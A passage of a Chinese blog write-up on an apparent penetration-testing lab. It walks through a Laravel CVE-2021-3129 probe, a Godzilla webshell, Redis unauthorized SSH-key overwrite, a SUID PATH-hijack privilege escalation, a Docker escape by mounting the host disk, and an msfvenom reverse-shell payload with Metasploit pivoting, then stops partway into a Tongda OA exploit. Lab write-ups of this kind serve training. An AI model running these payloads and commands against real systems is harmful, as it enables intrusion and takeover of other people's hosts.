+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0:8000-&gt;80/tcp</span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li>在 Ubuntu1 测试后端连通性：</li>
+</ol>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.29:8000</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>解决方法：</strong><br>修改 Nginx 配置文件：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/nginx/conf.d/81.conf</span><br></pre></td></tr></table></figure></div>
+
+<p>改为：</p>
+<div class="code-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">81</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://10.10.10.29:8000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>重启服务：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>最终结果：</strong><br>访问 <code>http://192.168.44.137:81/</code> 成功显示后端 Laravel 页面</p>
+<p><strong>一句话总结：</strong><br>502 的本质是 Nginx 连不上后端，本题是因为代理端口写错（80 → 实际应为 8000）</p>
+<hr>
+<h2 id="Web服务提权"><a href="#Web服务提权" class="headerlink" title="Web服务提权"></a>Web服务提权</h2><p>首先我们使用Kali机器，针对NAT网段：<code>192.168.44.0/24</code>进行扫描，看看目标资产存在哪些主机：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f210c9b5eadb4ab2871cca24385d831b.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后继续收集其开放了哪些端口以及服务：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="139c571622cb4a79941755faf19972c7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>而我们有Nmap进行扫描，还额外发现了一个Redis服务器的<strong>6379端口</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="0ff52988d9474de9bad9eea829ff7bef.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li><code>22</code>端口：SSH远程连接服务</li>
+<li><code>80</code>端口：HTTP服务</li>
+<li><code>81</code>端口：搭建的Web框架</li>
+<li><code>6379</code>端口：默认Redis服务开启</li>
+</ul>
+<h3 id="Web框架信息收集"><a href="#Web框架信息收集" class="headerlink" title="Web框架信息收集"></a>Web框架信息收集</h3><p>这里我们首先尝试访问 <a class="link"   target="_blank" rel="noopener" href="http://192.168.44.137:81/%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%85%B6%E6%90%AD%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AALarvel%E6%A1%86%E6%9E%B6%EF%BC%9A" >http://192.168.44.137:81/，发现其搭建了一个Larvel框架：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="2c8e961c07724c74a9e7889152fe7f79.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以知道，81端口上开放的Web服务是基于Laravel框架的。</p>
+<p>同时，从该页面右下角还可以看到使用的Laravel框架版本以及PHP版本，Laravel框架版本为<code>v8.29.0</code>，PHP版本为<code>v7.4.14</code></p>
+<p>通过<strong>CVE</strong>或者<strong>Seebug</strong>等搜索引擎可以搜索Laravel框架是否存在可以利用的漏洞，重点关注可以直接获取权限或者数据的漏洞:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c704ac1c25dc4ac49c469cd99f0eef59.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>经过排查，发现远程代码执行符合当前搭建的框架：<code>v8.29.0</code> &lt; v8.4.2</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="cb55129bfc3d4fd9b9aca6550459de6a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>下一步就要对Web服务器上运行的Lavarel框架进行漏洞测试，然后要对Redis数据库进行测试;</p>
+</blockquote>
+<h3 id="Laravel-RCE漏洞测试服务器81端口-哥斯拉"><a href="#Laravel-RCE漏洞测试服务器81端口-哥斯拉" class="headerlink" title="Laravel RCE漏洞测试服务器81端口(哥斯拉)"></a>Laravel RCE漏洞测试服务器81端口(哥斯拉)</h3><p>首先尝试发送漏洞检测POC数据包检测漏洞是否存在，数据包如下：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /  HTTP/1.1</span><br><span class="line">Host: 192.168.44.137:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">    <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>结果如下，确认存在漏洞：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="70dca85936a54110b84f5015703db5ab.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>用BP能渲染出页面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="b68b6be4cf1148b2a8fa5d3faa6537a4.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以看到目标Laravel服务开启了<strong>Debug模式</strong>，存在远程代码执行漏洞</p>
+<p>于是我们从网上查找符合CVE-2021-3129的EXP，并执行脚本：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="9330142fc23645eb83833917490a2ced.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>利用脚本可以对存在漏洞的Laravel框架自动获取shell：</p>
+<p>这里我们得到了Webshell的地址以及登陆密码pass，随后用哥斯拉进行访问：（因为它用的是<code>哥斯拉的Webshell</code>）</p>
+<ul>
+<li><code>哥斯拉V2.96版本</code>webshell管理工具可以连接成功；</li>
+</ul>
+<p>这里我暂时切换Java的版本：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到哥斯拉目录</span></span><br><span class="line"><span class="built_in">cd</span> /d D:\渗透tools\Webshell\Godzilla</span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时指定Java 8路径（仅当前窗口生效，不改系统全局）</span></span><br><span class="line"><span class="built_in">set</span> JAVA_HOME=C:\Program Files\Java\jdk1.8.0_91</span><br><span class="line"><span class="built_in">set</span> PATH=%JAVA_HOME%\bin;%PATH%</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证Java版本（显示1.8.0_91即成功）</span></span><br><span class="line">java -version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动哥斯拉（无UI版本报错）</span></span><br><span class="line">java -jar Godzilla-V2.96.jar</span><br></pre></td></tr></table></figure></div>
+<p>随后成功连接：<code>webshell地址:http://192.168.44.137:81/fuckyou.php,密码:pass</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5fb8d35c1b4a4d0ab6283090ce6bd835.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li>执行whoami命令得到当前用户名为<code>www-data</code>；</li>
+<li>执行 ls-al &#x2F;命令查看根目录下的文件列表信息发现存在<code>.dockerenv文件</code>，猜测当前系统环境为<strong>Docker环境</strong>；</li>
+<li>如果想了解如何进行docker逃逸，可以看：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73812072/article/details/158038108" >VulnStack-4靶场内网横向解析(Struts2，Tomcat，phpmyadmin漏洞利用，Dockers容器逃逸，Socks代理内网，PTH横向)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c8d9eec34f8949b2a118fc9c3c897bd5.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="如何确认是docker环境"><a href="#如何确认是docker环境" class="headerlink" title="如何确认是docker环境"></a>如何确认是docker环境</h3><p>使用<code>cat /proc/self/cgroup</code> 和 <code>hostname</code> 命令，看是否与上述Docker容器ID匹配：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5977f1055308417db35f484c9a86b2f5.png"
+                      alt="在这里插入图片描述"
+                ><br>可以确认当前环境为Docker环境；</p>
+<blockquote>
+<p>接下来我们要进行docker逃逸的话，需要对www-data用户进行提权；</p>
+</blockquote>
+<h3 id="Redis未授权访问漏洞测试6379端口与ssh免密登陆"><a href="#Redis未授权访问漏洞测试6379端口与ssh免密登陆" class="headerlink" title="Redis未授权访问漏洞测试6379端口与ssh免密登陆"></a>Redis未授权访问漏洞测试6379端口与ssh免密登陆</h3><p>之前我们发现目标主机还开放了6379端口，所以我们可以尝试看其是否存在漏洞：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆服务器</span></span><br><span class="line">redis-cli -h 192.168.44.137</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看信息</span></span><br><span class="line">info</span><br><span class="line">keys *</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="75354e73f0964dd89cbde51f37ae2b13.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>连接时发现该Redis数据库服务未设置认证，存在未授权访问漏洞；无须任何凭证信息即可访问Redis数据库服务；</p>
+<blockquote>
+<p>在Redis数据库服务存在未授权访问漏洞的情况下，常见的获取服务器<br>shell的方法一般有：</p>
+<ul>
+<li>写SSH-keygen</li>
+<li>写计划任务反弹shell</li>
+<li>写webshell</li>
+<li>利用主从复制获取shell等方式;</li>
+<li>可以通过Redis Desktop Manager操作Redis手工获取服务器shell，也可以使用工具进行自动化获取shell;</li>
+</ul>
+</blockquote>
+<p>这里我选择<strong>工具进行自动化</strong>获取：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="1d922b11d79444bca042ab52a882f349.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>成功连接Redis数据库后，会输出目标Redis数据库服务的相关信息，如Redis版本、是否允许主从备份等信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a56b97617861496cb8d25f7b9ebea875.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>该工具具备一键替换服务器SSH公钥的功能，但是需要事先生成SSH公私钥。所以需要先在Kali中运行<code>ssh-keygen -t rsa</code>命令，生成SSH公私钥：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f80f1d6ce2da4ceb83fa66466d9def7c.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>在<code>/root/.ssh</code>目录下将会生成SSH公私钥文件;</p>
+<p><code>cat/root/.ssh/id_rsa.pub</code>，随后将上述SSH公钥内容复制粘贴到窗口中，点击“开始替换”按钮，将目标Redis服务器的SSH公钥替换为本地生成的SSH公钥：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="459c6b52fe0c4004a04042de43d42d0e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="d1657bfee1b34f92bbbd040e112a5e0a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>SSH公钥替换成功后，接下来就可以使用本地生成的私钥登录目标Redis<br>服务器了：</p>
+<blockquote>
+<p>通过6379端口所在的Redis服务写入的SSH公钥可以直接通过开放的22端口进行登录；</p>
+<ul>
+<li>由此判断192.168.96.21:6379和192.168.96.21:22<strong>同属一台</strong>服务器。此处关于使用SSH私钥登录Linux主机的过程不再赘述；</li>
+</ul>
+</blockquote>
+<p>这里我们输入<code>id_rsa</code> 私钥后，即可成功连接目标主机：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="ac621f36f6a84947aef2e4b0c24e8129.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>成功连接：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="886107d817cf453fb099d877c9995cd1.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><code>至此，我们成功拿下了第一台Web主机，并且发现其有两个网段！</code></p>
+<h2 id="Laravel服务器提权"><a href="#Laravel服务器提权" class="headerlink" title="Laravel服务器提权"></a>Laravel服务器提权</h2><p>这里我们也不能忘了还有Laravel框架的机器呢；这里我们需要查看有什么能偶利用的方法，能够对其进行提权：</p>
+<ul>
+<li>SUID提权</li>
+<li>SUDO提权</li>
+<li>敏感文件提权</li>
+</ul>
+<p>经过测试，发现存在<code>SUID提权</code>：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="8eedc2f7ceeb4681b24f63dc50be309e.png"
+                      alt="在这里插入图片描述"
+                ><br>去到相应目录进行查看；</p>
+<p>执行这个脚本文件时，发现它输出了当前系统进程列表信息，<code>执行效果与Linux系统中的ps命令</code>类似：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="185b64c9ae164be2a29bede6894b7fea.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>转到&#x2F;home&#x2F;jobs&#x2F;目录下，通过ls-al命令查看&#x2F;home&#x2F;jobs&#x2F;目录下的文件信息。发现在该目录下，除了存在一个名为<strong>shell</strong>的可执行文件外，还存在一个<strong>demo.c</strong>文件：</p>
+<p>内容如下：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">void <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>猜测&#x2F;home&#x2F;jobs&#x2F;demo.c文件为&#x2F;home&#x2F;jobs&#x2F;shell可执行文件的源代码；</p>
+<h3 id="Laravel服务器权限提升"><a href="#Laravel服务器权限提升" class="headerlink" title="Laravel服务器权限提升"></a>Laravel服务器权限提升</h3><p>基于上面的Laravel服务器环境识别得到的信息，可以通过修改环境变量<code>$PATH</code>，让&#x2F;home&#x2F;jobs&#x2F;shell执行指定的测试程序，从而达到提权的目的：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/home# docker <span class="built_in">exec</span> -it 8e172820ac78 /bin/bash</span><br><span class="line">www-data@8e172820ac78:/var/www/html# <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@8e172820ac78:/tmp# <span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt;ps</span><br><span class="line">www-data@8e172820ac78:/tmp# <span class="built_in">chmod</span> 777 ps</span><br><span class="line">www-data@8e172820ac78:/tmp# <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">www-data@8e172820ac78:/tmp# <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">www-data@8e172820ac78:/tmp# </span><br></pre></td></tr></table></figure></div>
+<p>完成上述步骤后，再执行&#x2F;home&#x2F;jobs&#x2F;shell。由于修改了环境变量，&#x2F;tmp&#x2F;ps将会被执行，调起&#x2F;bin&#x2F;bash，得到一个root权限的shell：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@8e172820ac78:/tmp# /home/jobs/shell</span><br><span class="line">www-data@8e172820ac78:/tmp# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">www-data@8e172820ac78:/tmp#</span><br></pre></td></tr></table></figure></div>
+<h3 id="docker容器逃逸到宿主机"><a href="#docker容器逃逸到宿主机" class="headerlink" title="docker容器逃逸到宿主机"></a>docker容器逃逸到宿主机</h3><blockquote>
+<p>Docker容器提权成功后，依旧无法触及Docker容器宿主机所在的内部网络，所以此时必须对Docker环境进行逃逸；</p>
+</blockquote>
+<p>我们可以通过命令创建一个文件夹，然后将<code>/dev/sda1</code>挂载到该文件夹目录下，这样就可以访问宿主机的全部文件：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这样我们就能访问宿主机的所有文件</span></span><br><span class="line"><span class="built_in">mkdir</span> /tiquan</span><br><span class="line">mount /dev/sda1 /tiquan</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="9da35dfeac22487b9c4ddce42130feeb.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<ul>
+<li>既然已经可以成功操作宿主机的文件目录，那么就可以像利用Redis未授权访问漏洞获取shell一样，通过写入生成的SSH公钥来登录Docker宿主机服务器。</li>
+<li>这里要将SSH密钥写到&#x2F;tiquan&#x2F;root&#x2F;.ssh&#x2F;目录下，具体步骤与上文获取Redis服务器权限类似，在此不再赘述；</li>
+</ul>
+<blockquote>
+<p>SSH密钥写入成功后，我们并不能够直接从测试主机上使用SSH私钥登录Docker宿主机服务器；</p>
+<ul>
+<li>因为这台Docker宿主机并没有将SSH端口映射到外部；</li>
+<li>如果想登录Docker宿主机服务器，就必须使用一台与Docker宿主机相同内网环境的机器作为跳板机进行登录，而<code>Redis服务器</code>无疑是最佳选择；</li>
+</ul>
+</blockquote>
+<p>所以我们可以在redis服务器中登陆Laravel服务器：</p>
+<p>通过<code>ifconfig</code>命令查看Docker宿主机的网络配置，发现Docker宿主机与Redis服务器一样是双网卡的配置：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a5c348e823ba42949f0c79c3240502c9.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><code>至此，我们拿下了第二台主机的权限；</code></p>
+<hr>
+<h2 id="利用MSF搭建内网路由"><a href="#利用MSF搭建内网路由" class="headerlink" title="利用MSF搭建内网路由"></a>利用MSF搭建内网路由</h2><p>这里我们发现目标主机还有另一个网段：10.10.10.0&#x2F;24，所以我们需要测试该内网网段是否还存在其他主机：</p>
+<ul>
+<li>访问内网的方法有很多，比如搭建socks代理，DNS代理，MSF &#x2F; CS代理等；</li>
+<li>也可以使用工具进行访问；</li>
+</ul>
+<p>此时我们已经得到了两个内网网段：<code>10.10.10.0/24</code> 和 <code>10.10.20.0/24 </code>，但是我们的Kali访问不到，所以需要搭建socks代理：</p>
+<p>这里我们先生成payload，随后上传到这两台主机：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.44.129 LPORT=5555 -f elf &gt; MSF.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随后开启监听</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.44.129</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p>结果如下，成功上线Web服务器主机：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="23f6e88092de47b0a127929319f6b305.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后我们搭建socks代理，即可访问<strong>Ubuntu2主机</strong>：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入会话，添加一层内网网段到路由</span></span><br><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出会话，搭配socks模块使用</span></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvport 8081</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="bfbd0759a18a46459ad0844713df617e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>现在我们就可以通过192.168.44.129:8081的端口来转发内网流量了：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="3503c932d2c7423595a876c4b1d7c28d.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="一层内网信息收集"><a href="#一层内网信息收集" class="headerlink" title="一层内网信息收集"></a>一层内网信息收集</h3><p>这里我们配置好<code>proxifier</code> 后，对内网网段10.10.10.0&#x2F;24进行扫描：<code>proxychains nmap -sP 10.10.10.0/24</code>：</p>
+<p>当然也可以用其他工具：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="4b5aa205153c45f3b3ea4284bb2f8e2c.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>当再访问Docker宿主机<strong>10.10.10.29</strong>时，不再需要将Redis服务器作为跳板进行SSH登录，在Kali上也可以直接对Docker宿主机进行SSH连接：</p>
+<h3 id="二层内网信息收集"><a href="#二层内网信息收集" class="headerlink" title="二层内网信息收集"></a>二层内网信息收集</h3><p>所以我们也可以将二层内网网段10.10.20.0&#x2F;24添加到路由里：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入会话，添加二层内网网段到路由</span></span><br><span class="line">run autoroute -s 10.10.20.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出会话，搭配socks模块使用</span></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvport 8082</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="4746cffdc872410aab2c27b95f575866.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c79fba85657d4258a9efff3a1dd98a6a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后针对二层内网进行网段扫描：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6eb3b39005ad487293b625f54ff4d3a1.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5ea1426b56ec4c27800ca8afb784d7f9.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="bba175ac58e44c608097da926618fb63.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f392bc4543764c9dab2e5b1060398a8d.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>根据上述的结果，http:&#x2F;&#x2F;<strong>10.10.10.30</strong>:8080访问后的Web界面与http:&#x2F;&#x2F;<strong>10.10.20.14</strong>:8080的访问界面完全一致：（也就是Windows1机器开放的服务）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="fe7b4fd43e804db29e2dbe34b2581dd1.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>由于上述两个Web服务访问界面完全一致，且前面已经获得控制权的Docker宿主机的10.10.10.0&#x2F;24、10.10.20.0&#x2F;24两个网段在同一台主机上。</p>
+<p>由此可以猜测10.10.10.30和10.10.20.14也同属一台服务器；</p>
+<blockquote>
+<p>总结：我们发现了内网中的其他3台主机，并发现了域<code>whoamianony.org</code>；</p>
+<ul>
+<li>具体可以看<code>网络结构拓扑图</code>；</li>
+<li>同时在域内发现了<strong>通达OA</strong>网络智能办公系统服务以及开放了445端口的Windows 7系统主机；</li>
+<li>这意味着我们接下来很可能可以利用通达OA相关历史漏洞以及<strong>永恒之蓝</strong>漏洞进行测试；</li>
+</ul>
+</blockquote>
+<h2 id="内网横向阶段"><a href="#内网横向阶段" class="headerlink" title="内网横向阶段"></a>内网横向阶段</h2><p>现在我们针对Windows1的机器开放的通达OA以及445端口的永恒之蓝漏洞进行检测：<code>也就是第三台主机</code></p>
+<p>首先用Seebug等公开漏洞平台搜索通达OA存在的历史漏洞：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="4dbb2efde33a4e7897e6eb3f676748a7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>发现存在多个RCE漏洞，于是我们可以从网上寻找脚本payload进行测试：</p>
+<h3 id="通达OA漏洞利用-获取版本号"><a href="#通达OA漏洞利用-获取版本号" class="headerlink" title="通达OA漏洞利用(获取版本号)"></a>通达OA漏洞利用(获取版本号)</h3><p>根据网上的POC，我们先下载脚本：<a class="link"   target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" >https://github.com/NS-Sp4ce/TongDaOA-Fake-User<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>然后根据提示，输入代码：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python POC.py -v 2017 -url http://10.10.20.14:8080/</span><br></pre></td></tr></table></figure></div>
+<p>得到结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="bf05d9345b2a42c082f1f5e1438d5194.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>访问访问主页 <a class="link"   target="_blank" rel="noopener" href="http://10.10.20.14:8080/general/index.php" >http://10.10.20.14:8080/general/index.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="8ba0d202308c445c96c1cb764d06633b.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>修改cookie中PHPSESSID的值并刷新页面就会页面跳转：</p>
